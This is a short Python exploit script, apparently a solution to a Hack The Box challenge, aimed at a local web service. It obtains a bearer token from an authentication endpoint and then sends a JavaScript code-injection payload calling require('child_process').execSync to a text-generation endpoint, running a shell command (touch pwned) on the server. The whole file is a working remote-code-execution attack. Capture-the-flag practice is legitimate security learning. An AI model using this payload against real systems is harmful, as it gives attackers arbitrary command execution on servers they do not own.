import requests

url = "http://localhost:5000/api/auth/authenticate"
url2 = "http://localhost:5000/api/service/generate"
headers = {'Content-Type': 'application/json'}
payload = {'email': 'test@hackthebox.com'}

print("Attacking " + url)
post = requests.post(url, json=payload, headers=headers)
data = post.text

token = post.json().get('token')
print("The standalone token is: ", token)

headers2 = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {token}'
}
inj = "'}) + require('child_process').execSync('touch pwned')//"
payload2 = {'text': f"{inj}"}
post2 = requests.post(url2, json=payload2, headers=headers2)
data2 = post2.text
print(data2)
